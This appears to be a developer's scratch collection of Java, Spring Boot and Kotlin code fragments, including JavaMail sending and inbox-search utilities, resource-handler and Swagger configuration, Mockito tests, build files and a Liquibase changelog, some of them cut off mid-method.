public class SpringAsyncConfig implements AsyncConfigurer {
     
    @Override
    public Executor getAsyncExecutor() {
        return new ThreadPoolTaskExecutor();
    }    
}
public class CustomAsyncExceptionHandler
  implements AsyncUncaughtExceptionHandler {
 
    @Override
    public void handleUncaughtException(
      Throwable throwable, Method method, Object... obj) {
  
        System.out.println("Exception message - " + throwable.getMessage());
        System.out.println("Method name - " + method.getName());
        for (Object param : obj) {
            System.out.println("Parameter value - " + param);
        }
    }
}
--------------------------------------------------------------------------------------------------------
    private Properties getProperties() {
        Properties props = new Properties();
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.auth", "false");
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.port", port);
        props.put("mail.smtp.timeout", 5000);
        props.put("mail.smtp.connectiontimeout", 5000);
        props.put("mail.transport.protocol", "smtp");
        return props;
    }
--------------------------------------------------------------------------------------------------------
        Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());

        props.setProperty("mail.pop3.port", "995");
        props.setProperty("mail.pop3.socketFactory.port", "995");
        props.setProperty("mail.pop3.socketFactory.fallback", "false");
        props.setProperty("mail.pop3.connectiontimeout", "5000");
        props.setProperty("mail.pop3.timeout", "5000");
    }
--------------------------------------------------------------------------------------------------------
import java.util.Properties;

import javax.mail.Address;
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;


public class EmailSender {
    public EmailSender() {
    }

    public static void sendEmail( String to, String subject, String from, String content) throws Exception{
        Properties props = new Properties();
        props.setProperty("mail.transport.protocol", "smtp");
        props.setProperty("mail.host", "localhost"); 
        props.setProperty("mail.user", "coa-web"); 
        props.setProperty("mail.password", "");

        Session mailSession = Session.getDefaultInstance(props, null);
        Transport transport = mailSession.getTransport();

        MimeMessage message = new MimeMessage(mailSession);
        message.addFrom(new Address[] { new InternetAddress("coa-web@localhost",from)});  // the reply to email address and a logical descriptor of the sender of the email!

        message.setSubject(subject);
        message.setContent(content, "text/plain");
        message.addRecipient(Message.RecipientType.TO,
             new InternetAddress(to));

        transport.connect();
        transport.sendMessage(message,
            message.getRecipients(Message.RecipientType.TO));
        transport.close();
        }
        
        public static void main (String[] args) throws Exception {
            String content = "Some test content.";
            EmailSender.sendEmail("coa-backoffice@localhost","An interesting message","THE APP",content);
        }
   }
   
   package nl.amis.util;

import java.io.*;
import java.util.*;
import javax.mail.*;
import javax.mail.internet.*;

public class EmailClient  extends Authenticator
{
  public static final int SHOW_MESSAGES = 1;
  public static final int CLEAR_MESSAGES = 2;
  public static final int SHOW_AND_CLEAR =
    SHOW_MESSAGES + CLEAR_MESSAGES;
  
  protected String from;
  protected Session session;
  protected PasswordAuthentication authentication;
  
  public EmailClient(String user, String host)   {
    this(user, host, false);
  }
  
  public EmailClient(String user, String host, boolean debug)  {
    from = user + '@' + host;
    authentication = new PasswordAuthentication(user, user);
    Properties props = new Properties();
    props.put("mail.user", user);
    props.put("mail.host", host);
    props.put("mail.debug", debug ? "true" : "false");
    props.put("mail.store.protocol", "pop3");
    props.put("mail.transport.protocol", "smtp");
    session = Session.getInstance(props, this);
  }
  
  public PasswordAuthentication getPasswordAuthentication()  {
    return authentication;
  }
   
  public void checkInbox(int mode)
    throws MessagingException, IOException  {
    if (mode == 0) return;
    boolean show = (mode & SHOW_MESSAGES) > 0;
    boolean clear = (mode & CLEAR_MESSAGES) > 0;
    String action =
      (show ? "Show" : "") +
      (show && clear ? " and " : "") +
      (clear ? "Clear" : "");
    System.out.println(action + " INBOX for " + from);
    Store store = session.getStore();
    store.connect();
    Folder root = store.getDefaultFolder();
    Folder inbox = root.getFolder("Inbox");
    inbox.open(Folder.READ_WRITE);
    Message[] msgs = inbox.getMessages();
    if (msgs.length == 0 && show)
    {
      System.out.println("No messages in inbox");
    }
    for (int i = 0; i < msgs.length; i++)
    {
      MimeMessage msg = (MimeMessage)msgs[i];
      if (show)
      {
        System.out.println("    From: " + msg.getFrom()[0]);
        System.out.println(" Subject: " + msg.getSubject());
        System.out.println(" Content: " + msg.getContent());
      }
      if (clear)
      {
        msg.setFlag(Flags.Flag.DELETED, true);
      }
    }
    inbox.close(true);
    store.close();
    System.out.println();
  }
  public static void main(String[] args) throws Exception{
      // CREATE CLIENT INSTANCES
      EmailClient emailClient = new EmailClient("coa-backoffice", "localhost", false);
         
      // LIST MESSAGES FOR email client
      emailClient.checkInbox(EmailClient.SHOW_MESSAGES);
  }
}
--------------------------------------------------------------------------------------------------------
    @Bean()
    public ThreadPoolTaskScheduler taskScheduler(){
        ThreadPoolTaskScheduler taskScheduler = new ThreadPoolTaskScheduler();
        taskScheduler.setPoolSize(2);
        return  taskScheduler;
    }

    public static final Class<Void> TYPE = (Class<Void>) Class.getPrimitiveClass("void");
--------------------------------------------------------------------------------------------------------
Входящая почта
адрес почтового сервера — pop.yandex.ru;
защита соединения — SSL;
порт — 995.
Исходящая почта
адрес почтового сервера — smtp.yandex.ru;
защита соединения — SSL;
порт — 465.

Входящая почта
адрес почтового сервера — imap.yandex.ru;
защита соединения — SSL;
порт — 993.
Исходящая почта
адрес почтового сервера — smtp.yandex.ru;
защита соединения — SSL;
порт — 465.
--------------------------------------------------------------------------------------------------------
package net.codejava.mail;
 
import java.io.IOException;
import java.util.Date;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
 
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
 
/**
 * This utility class provides a functionality to send an HTML e-mail message
 * with embedded images.
 * @author www.codejava.net
 *
 */
public class EmbeddedImageEmailUtil {
 
    /**
     * Sends an HTML e-mail with inline images.
     * @param host SMTP host
     * @param port SMTP port
     * @param userName e-mail address of the sender's account
     * @param password password of the sender's account
     * @param toAddress e-mail address of the recipient
     * @param subject e-mail subject
     * @param htmlBody e-mail content with HTML tags
     * @param mapInlineImages
     *          key: Content-ID
     *          value: path of the image file
     * @throws AddressException
     * @throws MessagingException
     */
    public static void send(String host, String port,
            final String userName, final String password, String toAddress,
            String subject, String htmlBody,
            Map<String, String> mapInlineImages)
                throws AddressException, MessagingException {
        // sets SMTP server properties
        Properties properties = new Properties();
        properties.put("mail.smtp.host", host);
        properties.put("mail.smtp.port", port);
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.user", userName);
        properties.put("mail.password", password);
 
        // creates a new session with an authenticator
        Authenticator auth = new Authenticator() {
            public PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(userName, password);
            }
        };
        Session session = Session.getInstance(properties, auth);
 
        // creates a new e-mail message
        Message msg = new MimeMessage(session);
 
        msg.setFrom(new InternetAddress(userName));
        InternetAddress[] toAddresses = { new InternetAddress(toAddress) };
        msg.setRecipients(Message.RecipientType.TO, toAddresses);
        msg.setSubject(subject);
        msg.setSentDate(new Date());
 
        // creates message part
        MimeBodyPart messageBodyPart = new MimeBodyPart();
        messageBodyPart.setContent(htmlBody, "text/html");
 
        // creates multi-part
        Multipart multipart = new MimeMultipart();
        multipart.addBodyPart(messageBodyPart);
 
        // adds inline image attachments
        if (mapInlineImages != null && mapInlineImages.size() > 0) {
            Set<String> setImageID = mapInlineImages.keySet();
             
            for (String contentId : setImageID) {
                MimeBodyPart imagePart = new MimeBodyPart();
                imagePart.setHeader("Content-ID", "<" + contentId + ">");
                imagePart.setDisposition(MimeBodyPart.INLINE);
                 
                String imageFilePath = mapInlineImages.get(contentId);
                try {
                    imagePart.attachFile(imageFilePath);
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
 
                multipart.addBodyPart(imagePart);
            }
        }
 
        msg.setContent(multipart);
 
        Transport.send(msg);
    }
}

package net.codejava.mail;
 
import java.util.HashMap;
import java.util.Map;
 
/**
 * This program tests out the EmbeddedImageEmailUtil utility class.
 * @author www.codejava.net
 *
 */
public class InlineImageEmailTester {
 
    /**
     * main entry of the program
     */
    public static void main(String[] args) {
        // SMTP info
        String host = "smtp.gmail.com";
        String port = "587";
        String mailFrom = "YOUR_EMAIL";
        String password = "YOUR_PASSWORD";
 
        // message info
        String mailTo = "YOUR_RECIPIENT";
        String subject = "Test e-mail with inline images";
        StringBuffer body
            = new StringBuffer("<html>This message contains two inline images.<br>");
        body.append("The first image is a chart:<br>");
        body.append("<img src=\"cid:image1\" width=\"30%\" height=\"30%\" /><br>");
        body.append("The second one is a cube:<br>");
        body.append("<img src=\"cid:image2\" width=\"15%\" height=\"15%\" /><br>");
        body.append("End of message.");
        body.append("</html>");
 
        // inline images
        Map<String, String> inlineImages = new HashMap<String, String>();
        inlineImages.put("image1", "E:/Test/chart.png");
        inlineImages.put("image2", "E:/Test/cube.jpg");
 
        try {
            EmbeddedImageEmailUtil.send(host, port, mailFrom, password, mailTo,
                subject, body.toString(), inlineImages);
            System.out.println("Email sent.");
        } catch (Exception ex) {
            System.out.println("Could not send email.");
            ex.printStackTrace();
        }
    }
}
--------------------------------------------------------------------------------------------------------
private static final String[] CLASSPATH_RESOURCE_LOCATIONS = {
		"classpath:/META-INF/resources/", "classpath:/resources/",
		"classpath:/static/", "classpath:/public/" };
		
@Override
public void addResourceHandlers(ResourceHandlerRegistry registry) {
	if (!registry.hasMappingForPattern("/webjars/**")) {
		registry.addResourceHandler("/webjars/**").addResourceLocations(
				"classpath:/META-INF/resources/webjars/");
	}
	if (!registry.hasMappingForPattern("/**")) {
		registry.addResourceHandler("/**").addResourceLocations(
				RESOURCE_LOCATIONS);
	}
}

   @Override
   public void addResourceHandlers(ResourceHandlerRegistry registry) {

      // Register resource handler for CSS and JS
      registry.addResourceHandler("/resources/**").addResourceLocations("classpath:/statics/", "D:/statics/")
            .setCacheControl(CacheControl.maxAge(2, TimeUnit.HOURS).cachePublic());

      // Register resource handler for images
      registry.addResourceHandler("/images/**").addResourceLocations("/WEB-INF/images/")
            .setCacheControl(CacheControl.maxAge(2, TimeUnit.HOURS).cachePublic());
   }
--------------------------------------------------------------------------------------------------------
@Service
class InternalRequestRewriteFilter(
        @Value("\${server.servlet.context-path}") private val contextPath: String): WebFilter {
    private val pathMatcher = AntPathMatcher()
    private val swaggerPaths = setOf("swagger-ui.html", "webjars/springfox-*/**", "swagger-resources/**", "v2/api-docs")
    private val logger = getLogger(javaClass)

    override fun filter(exchange: ServerWebExchange, chain: WebFilterChain): Mono<Void> {
        // Get the path of the request
        val path = exchange.request.path.pathWithinApplication().value()
        // If the path leads to an swagger element -> remove the context path for the internal processing
        val modifiedExchange = if (isSwaggerRequest(exchange.request)) {
            logger.debug("""Swagger request detected for path "$path"""")
            exchange.mutate().request(exchange.request.mutate().path(path.replaceFirst(contextPath, "")).build()).build()
        } else {
            exchange
        }
        // Execute the normal filter chain
        return chain.filter(modifiedExchange)
    }

    private fun isSwaggerRequest(request: ServerHttpRequest): Boolean {
        // Get the path of the request
        val path = request.path.pathWithinApplication().value()

        return swaggerPaths.any {swaggerPath -> pathMatcher.match("$contextPath/$swaggerPath", path)}
    }
}
--------------------------------------------------------------------------------------------------------
String ResultString = null;

Pattern regex = Pattern.compile("^.*\\\\", Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE);
Matcher regexMatcher = regex.matcher(subjectString);
if (regexMatcher.find()) {
	ResultString = regexMatcher.group();
--------------------------------------------------------------------------------------------------------
@EnableAutoConfiguration
public class ReplaceDefaultLocationsExample {

    public static void main (String[] args) {

        SpringApplication app =
                  new SpringApplication(ReplaceDefaultLocationsExample.class);

        Properties properties = new Properties();
        properties.setProperty("spring.resources.static-locations",
                          "classpath:/newLocation1/, classpath:/newLocation2/");
        app.setDefaultProperties(properties);
        app.run(args);
    }
}
--------------------------------------------------------------------------------------------------------
package com.javacodegeeks.snippets.enterprise;
 
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
 
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.AbstractController;
 
public class HelloWorldController extends AbstractController{
 
    @Override
    protected ModelAndView handleRequestInternal(HttpServletRequest request,
            HttpServletResponse response) throws Exception {
 
        ModelAndView model = new ModelAndView("helloWorld");
        model.addObject("msg", "hello world!");
         
        return model;
    }
         
}
--------------------------------------------------------------------------------------------------------
    @Bean
    WebMvcConfigurer configurer () {
        return new WebMvcConfigurerAdapter() {
            @Override
            public void addResourceHandlers (ResourceHandlerRegistry registry) {
                registry.addResourceHandler("/pages/**").
                          addResourceLocations("classpath:/my-custom-location/");
            }
        };
    }
--------------------------------------------------------------------------------------------------------
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
<head>
  <meta charset="UTF-8">
  <title>Rest Doc</title>
  <link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/swagger-api/swagger-ui/master/dist/swagger-ui.css"
        th:href="@{/webjars/swagger-ui/3.0.17/swagger-ui.css}">
</head>
<body>

<div id="swagger-ui"></div>

<script src="https://raw.githubusercontent.com/swagger-api/swagger-ui/master/dist/swagger-ui-bundle.js"
        th:src="@{/webjars/swagger-ui/3.0.17/swagger-ui-bundle.js}">
</script>
<script src="https://raw.githubusercontent.com/swagger-api/swagger-ui/master/dist/swagger-ui-standalone-preset.js"
        th:src="@{/webjars/swagger-ui/3.0.17/swagger-ui-standalone-preset.js}"></script>
<script>
  window.onload = function () {

    // Build a system
    window.ui = SwaggerUIBundle({
      url: "/v2/api-docs",
      dom_id: '#swagger-ui',
      presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIStandalonePreset
      ],
      plugins: [
        SwaggerUIBundle.plugins.DownloadUrl
      ],
      layout: "StandaloneLayout"
    })
  }
</script>
</body>
</html>
--------------------------------------------------------------------------------------------------------
package net.codejava.mail;
 
import javax.mail.Address;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.search.SearchTerm;
 
public class FromFieldSearchTerm extends SearchTerm {
    private String fromEmail;
     
    public FromFieldSearchTerm(String fromEmail) {
        this.fromEmail = fromEmail;
    }
     
    @Override
    public boolean match(Message message) {
        try {
            Address[] fromAddress = message.getFrom();
            if (fromAddress != null && fromAddress.length > 0) {
                if (fromAddress[0].toString().contains(fromEmail)) {
                    return true;
                }
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        }
         
        return false;
    }
     
}

package net.codejava.mail;
 
import java.util.Date;
 
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.search.SearchTerm;
 
public class SentDateSearchTerm extends SearchTerm {
    private Date afterDate;
     
    public SentDateSearchTerm(Date afterDate) {
        this.afterDate = afterDate;
    }
     
    @Override
    public boolean match(Message message) {
        try {
            if (message.getSentDate().after(afterDate)) {
                return true;
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        }
        return false;
    }
 
}

package net.codejava.mail;
 
import java.io.IOException;
 
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.search.SearchTerm;
 
public class ContentSearchTerm extends SearchTerm {
    private String content;
     
    public ContentSearchTerm(String content) {
        this.content = content;
    }
     
    @Override
    public boolean match(Message message) {
        try {
            String contentType = message.getContentType().toLowerCase();
            if (contentType.contains("text/plain")
                    || contentType.contains("text/html")) {
                String messageContent = message.getContent().toString();
                if (messageContent.contains(content)) {
                    return true;
                }
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        return false;
    }
 
}

SearchTerm term = new SearchTerm() {
    public boolean match(Message message) {
        try {
            if (message.getSubject().contains("Java")) {
                return true;
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        }
        return false;
    }
};
--------------------------------------------------------------------------------------------------------
spring.data.web.pageable.size-parameter=size
spring.data.web.pageable.page-parameter=page
spring.data.web.pageable.default-page-size=10
spring.data.web.pageable.one-indexed-parameters=false
spring.data.web.pageable.max-page-size=2000
spring.data.web.pageable.prefix=
spring.data.web.pageable.qualifier-delimiter=_

	@GetMapping(path = "/characters/page")
	Page<MovieCharacter> loadCharactersPage(
			@PageableDefault(page = 0, size = 20)
			@SortDefault.SortDefaults({
					@SortDefault(sort = "name", direction = Sort.Direction.DESC),
					@SortDefault(sort = "id", direction = Sort.Direction.ASC)
			})
		Pageable pageable) {
		return characterRepository.findAllPage(pageable);
	}
--------------------------------------------------------------------------------------------------------
@ResponseBody
@RequestMapping(value="/upload/", method=RequestMethod.POST, 
        produces = "text/plain")
public String uploadFile(MultipartHttpServletRequest request) 
        throws IOException {

  Iterator<String> itr = request.getFileNames();

  MultipartFile file = request.getFile(itr.next());
  MultiValueMap<String, Object> parts = 
          new LinkedMultiValueMap<String, Object>();
  parts.add("file", new ByteArrayResource(file.getBytes()));
  parts.add("filename", file.getOriginalFilename());

  RestTemplate restTemplate = new RestTemplate();
  HttpHeaders headers = new HttpHeaders();
  headers.setContentType(MediaType.MULTIPART_FORM_DATA);

  HttpEntity<MultiValueMap<String, Object>> requestEntity =
          new HttpEntity<MultiValueMap<String, Object>>(parts, headers);

  // file upload path on destination server
  parts.add("destination", "./");

  ResponseEntity<String> response =
          restTemplate.exchange("http://localhost:8080/pi", 
                  HttpMethod.POST, requestEntity, String.class);

  if (response != null && !response.getBody().trim().equals("")) {
    return response.getBody();
  }

  return "error";
}

curl --form file=@test.dat localhost:8080/upload/
--------------------------------------------------------------------------------------------------------
@Service
public class MyService {
 
  @Retryable(value = {FooException.class, BarException.class}, maxAttempts = 5)
  public void retryWithException() {
    // perform operation that is likely to fail
  }
 
  @Recover
  public void recover(FooException exception) {
    // recover from FooException
  }
}
--------------------------------------------------------------------------------------------------------
final BusinessOperation<String> op = new Retry<>(
    new FindCustomer(
        "1235",
        new CustomerNotFoundException("not found"),
        new CustomerNotFoundException("still not found"),
        new CustomerNotFoundException("don't give up yet!")
    ),
    5,
    100,
    e -> CustomerNotFoundException.class.isAssignableFrom(e.getClass())
);
--------------------------------------------------------------------------------------------------------
@PostConstruct
public void postConstruct(){
  logger.info("SECURITY MODULE LOADED!");
}
  
  
import org.springframework.boot.context.properties.ConfigurationPropertiesBinding;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
@EnableConfigurationProperties(MailModuleProperties.class)
class MailModuleConfiguration {

	@Bean
	@ConfigurationPropertiesBinding
	public WeightConverter weightConverter() {
		return new WeightConverter();
	}

}

@DeprecatedConfigurationProperty(reason = "not needed anymore", replacement = "none")
public String getDefaultSubject() {
  return defaultSubject;
}
--------------------------------------------------------------------------------------------------------
   public static boolean isSelinuxFlagInEnabled() {
        try {
            Class<?> c = Class.forName("android.os.SystemProperties");
            Method get = c.getMethod("get", String.class);
            String selinux = (String) get.invoke(c, "ro.build.selinux");
            return "1".equals(selinux);
        } catch (Exception ignored) {

        }
        return false;
    }
--------------------------------------------------------------------------------------------------------
import java.io.PrintWriter;
import java.io.StringWriter;

import android.util.Log;

public final class QLog {
    public static final int NONE = 0;
    public static final int ERRORS_ONLY = 1;
    public static final int ERRORS_WARNINGS = 2;
    public static final int ERRORS_WARNINGS_INFO = 3;
    public static final int ERRORS_WARNINGS_INFO_DEBUG = 4;
    public static final int ALL = 5;

    public static int LOGGING_LEVEL = ALL;

    /*
     * For filtering app specific output
     */
    private static final String TAG = "RootBeer";
    /*
     * So any important logs can be outputted in non filtered output also
     */
    private static final String TAG_GENERAL_OUTPUT = "QLog";

    static {
        //i("Log class reloaded");
    }

    /**
     * @param obj the object to log
     * @param cause
     *            The exception which caused this error, may not be null
     */
    public static void e(final Object obj, final Throwable cause) {
        if (isELoggable()) {
            Log.e(TAG, getTrace() + String.valueOf(obj));
            Log.e(TAG, getThrowableTrace(cause));
            Log.e(TAG_GENERAL_OUTPUT, getTrace() + String.valueOf(obj));
            Log.e(TAG_GENERAL_OUTPUT, getThrowableTrace(cause));
        }
    }

    public static void e(final Object obj) {
        if (isELoggable()) {
            Log.e(TAG, getTrace() + String.valueOf(obj));
            Log.e(TAG_GENERAL_OUTPUT, getTrace() + String.valueOf(obj));
        }
    }

    public static void w(final Object obj, final Throwable cause) {
        if (isWLoggable()) {
            Log.w(TAG, getTrace() + String.valueOf(obj));
            Log.w(TAG, getThrowableTrace(cause));
            Log.w(TAG_GENERAL_OUTPUT, getTrace() + String.valueOf(obj));
            Log.w(TAG_GENERAL_OUTPUT, getThrowableTrace(cause));
        }
    }

    public static void w(final Object obj) {
        if (isWLoggable()) {
            Log.w(TAG, getTrace() + String.valueOf(obj));
            Log.w(TAG_GENERAL_OUTPUT, getTrace() + String.valueOf(obj));
        }
    }

    public static void i(final Object obj) {
        if (isILoggable()) {
            Log.i(TAG, getTrace() + String.valueOf(obj));
        }
    }

    public static void d(final Object obj) {
        if (isDLoggable()) {
            Log.d(TAG, getTrace() + String.valueOf(obj));
        }
    }

    public static void v(final Object obj) {
        if (isVLoggable()) {
            Log.v(TAG, getTrace() + String.valueOf(obj));
        }
    }

    public static boolean isVLoggable() {
        return LOGGING_LEVEL > ERRORS_WARNINGS_INFO_DEBUG;
    }

    public static boolean isDLoggable() {
        return LOGGING_LEVEL > ERRORS_WARNINGS_INFO;
    }

    public static boolean isILoggable() {
        return LOGGING_LEVEL > ERRORS_WARNINGS;
    }

    public static boolean isWLoggable() {
        return LOGGING_LEVEL > ERRORS_ONLY;
    }

    public static boolean isELoggable() {
        return LOGGING_LEVEL > NONE;
    }

    private static String getThrowableTrace(final Throwable thr) {
        StringWriter b = new StringWriter();
        thr.printStackTrace(new PrintWriter(b));
        return b.toString();
    }

    private static String getTrace() {
        int depth = 2;
        Throwable t = new Throwable();
        StackTraceElement[] elements = t.getStackTrace();
        String callerMethodName = elements[depth].getMethodName();
        String callerClassPath = elements[depth].getClassName();
        int lineNo = elements[depth].getLineNumber();
        int i = callerClassPath.lastIndexOf('.');
        String callerClassName = callerClassPath.substring(i + 1);
        return callerClassName + ": " + callerMethodName + "() ["
                + lineNo + "] - ";
    }

    /**
     * Prints the stack trace to mubaloo log and standard log
     *
     * @param e the exception to log
     */
    public static void handleException(final Exception e) {
        QLog.e(e.toString());
        e.printStackTrace();
    }

    private QLog() {
    }
}

<maven.build.timestamp.format>yyyy-MM-dd HH:mm:ssZ</maven.build.timestamp.format>
--------------------------------------------------------------------------------------------------------
echo "RUN THE PROJECT IN THE SERVER/LOCAL"

echo "Compiling while skipping tests ..."
./mvnw clean install -DskipTests
echo "Compilation finished"

echo "Kill the process on port 8080, to undeploy the former version if existing"
sudo kill $(sudo lsof -t -i:8080)

echo "Let's deploy the new version silently"
nohup ./mvnw spring-boot:run &
--------------------------------------------------------------------------------------------------------
bitbucket-pipelines.yml

image: maven:3.3.3

pipelines:
  default:
    - step:
        caches:
          - maven
        script:
          - bash bin/configure-pipelines.sh
          - mvn --version
          - mvn clean verify javadoc:jar
--------------------------------------------------------------------------------------------------------
@Test
public void givenListOfCustomers_whenTransformed_thenListOfAddress() {
    Collection<Address> addressCol = CollectionUtils.collect(list1, 
      new Transformer<Customer, Address>() {
        public Address transform(Customer customer) {
            return customer.getAddress();
        }
    });
     
    List<Address> addressList = new ArrayList<>(addressCol);
    assertTrue(addressList.size() == 3);
    assertTrue(addressList.get(0).getLocality().equals("locality1"));
}
@Test
public void givenCustomerList_WhenFiltered_thenCorrectSize() {
     
    boolean isModified = CollectionUtils.filter(linkedList1, 
      new Predicate<Customer>() {
        public boolean evaluate(Customer customer) {
            return Arrays.asList("Daniel","Kyle").contains(customer.getName());
        }
    });
      
    assertTrue(linkedList1.size() == 2);
}

--------------------------------------------------------------------------------------------------------
	ext {
		springBootVersion = '1.5.4.RELEASE'
	}
	repositories {
		mavenCentral()
	}
	dependencies {
		classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}")
	}
}

apply plugin: 'java'
apply plugin: 'eclipse'
apply plugin: 'org.springframework.boot'

version = '0.0.1-SNAPSHOT'
sourceCompatibility = 11

repositories {
	mavenLocal()
	mavenCentral()
}

dependencies {
	compile('org.springframework.boot:spring-boot-starter-web')
	compile project(':spring-boot:modular:security-module')
	compile project(':spring-boot:modular:booking-module')
	testCompile('org.springframework.boot:spring-boot-starter-test')
}

bootRun{
	jvmArgs = ["-Xdebug", "-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006"]
	systemProperties = System.properties
}
--------------------------------------------------------------------------------------------------------
## db.changelog-master.yaml

databaseChangeLog:
- preConditions:
  - runningAs:
      username: sa

- changeSet:
    id: 1
    author: hombergs
    changes:
    - createTable:
        tableName: booking
        columns:
        - column:
            name: id
            type: bigint
            autoIncrement: true
            constraints:
              primaryKey: true
              nullable: false
        - column:
            name: customer_id
            type: bigint
        - column:
            name: flight_number
            type: varchar(50)
            constraints:
              nullable: false

- changeSet:
    id: 2
    author: hombergs
    changes:
    - createTable:
        tableName: customer
        columns:
        - column:
            name: id
            type: bigint
            autoIncrement: true
            constraints:
              primaryKey: true
              nullable: false
        - column:
            name: name
            type: varchar(50)
            constraints:
              nullable: false

- changeSet:
    id: 3
    author: hombergs
    changes:
    - createTable:
        tableName: flight
        columns:
        - column:
            name: flight_number
            type: varchar(50)
            constraints:
              nullable: false
        - column:
            name: airline
            type: varchar(50)
            constraints:
              nullable: false


- changeSet:
    id: 4
    author: hombergs
    changes:
    - createTable:
        tableName: user
        columns:
        - column:
            name: id
            type: bigint
            autoIncrement: true
            constraints:
              primaryKey: true
              nullable: false
        - column:
            name: name
            type: varchar(50)
            constraints:
              nullable: false
        - column:
            name: email
            type: varchar(50)
            constraints:
              nullable: false
        - column:
            name: registration_date
            type: timestamp
            constraints:
              nullable: false

- changeSet:
    id: 5
    author: hombergs
    changes:
    - createSequence:
        sequenceName: hibernate_sequence
--------------------------------------------------------------------------------------------------------
Size.customer.firstName=First Name must be longer than {min} characters
Size.customer.lastName=Last Name must be longer than {min} characters
Size.customer.description=Description must be longer than {min} characters
Size.customer.branch=Branch must be longer than {min} characters

Min.customer.age=Age must be greater than {value}
Max.customer.age=Age must be less than {value}

BranchCode.customer.branch=Branch must start with {value}
--------------------------------------------------------------------------------------------------------
 <profiles>
        <profile>
            <id>securityOff</id>
            <properties>
                <surefire.security.argline />
            </properties>
            <build>
                <plugins>
                    <plugin>
                        <groupId>org.apache.maven.plugins</groupId>
                        <artifactId>maven-surefire-plugin</artifactId>
                        <configuration>
                            <excludes>
                                <exclude>**/SecurityManagerConfiguredTest.java</exclude>
                            </excludes>
                        </configuration>
                    </plugin>
                </plugins>
            </build>
        </profile>
        <profile>
            <id>sonar</id>
            <build>
                <plugins>
                    <plugin>
                        <groupId>org.apache.maven.plugins</groupId>
                        <artifactId>maven-surefire-plugin</artifactId>
                        <configuration>
                            <!-- disable parallel execution so that JaCoCo listener can properly work -->
                            <parallel>none</parallel>
                            <perCoreThreadCount>false</perCoreThreadCount>
                            <forkCount>1</forkCount>
                        </configuration>
                    </plugin>
                    <plugin>
                        <artifactId>maven-shade-plugin</artifactId>
                        <executions>
                            <execution>
                                <id>shade-archive</id>
                                <phase>none</phase>
                            </execution>
                        </executions>
                    </plugin>
                </plugins>
            </build>
        </profile>
    </profiles>

    <properties>
        <surefire.security.argline>-Djava.security.manager -Djava.security.policy=${project.build.directory}/test-classes/server.policy</surefire.security.argline>
    </properties>
--------------------------------------------------------------------------------------------------------
public static <K, V> Matcher<Map<K, V>> hasSize(final int size) {
    return new TypeSafeMatcher<Map<K, V>>() {
        @Override
        public boolean matchesSafely(Map<K, V> kvMap) {
            return kvMap.size() == size;
        }

        @Override
        public void describeTo(Description description) {
            description.appendText(" has ").appendValue(size).appendText(" key/value pairs");
        }
    };
}
--------------------------------------------------------------------------------------------------------
package com.tdd;
import static org.hamcrest.CoreMatchers.is;
import static org.junit.Assert.assertThat;
import static org.mockito.Mockito.*;
import org.junit.Before;
import org.junit.Test;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
public class CustomerServiceTest {
    @Mock
    private CustomerDao daoMock;
    @InjectMocks
    private CustomerService service;
    @Before
    public void setUp() throws Exception {
        MockitoAnnotations.initMocks(this);
    }
     @Test
        public void testAddCustomer_returnsNewCustomer() {
            when(daoMock.save(any(Customer.class))).thenReturn(new Customer());
            Customer customer = new Customer();
            assertThat(service.addCustomer(customer), is(notNullValue()));
        }
    //Using Answer to set an id to the customer which is passed in as a parameter to the mock method.
    @Test
    public void testAddCustomer_returnsNewCustomerWithId() {
        when(daoMock.save(any(Customer.class))).thenAnswer(new Answer<Customer>() {
            @Override
            public Customer answer(InvocationOnMock invocation) throws Throwable {
                Object[] arguments = invocation.getArguments();
                if (arguments != null && arguments.length > 0 && arguments[0] != null){
                    Customer customer = (Customer) arguments[0];
                    customer.setId(1);
                    return customer;
                }
                return null;
            }
        });
        Customer customer = new Customer();
        assertThat(service.addCustomer(customer), is(notNullValue()));
    }
    //Throwing an exception from the mocked method
     @Test(expected = RuntimeException.class)
        public void testAddCustomer_throwsException() {
            when(daoMock.save(any(Customer.class))).thenThrow(RuntimeException.class);
            Customer customer = new Customer();
            service.addCustomer(customer);//
        }
}
--------------------------------------------------------------------------------------------------------
@Test
    public void testUpdate() {
        doAnswer(new Answer<Void>() {
            @Override
            public Void answer(InvocationOnMock invocation) throws Throwable {
                Object[] arguments = invocation.getArguments();
                if (arguments != null && arguments.length > 1 && arguments[0] != null && arguments[1] != null) {
                    Customer customer = (Customer) arguments[0];
                    String email = (String) arguments[1];
                    customer.setEmail(email);
                }
                return null;
            }
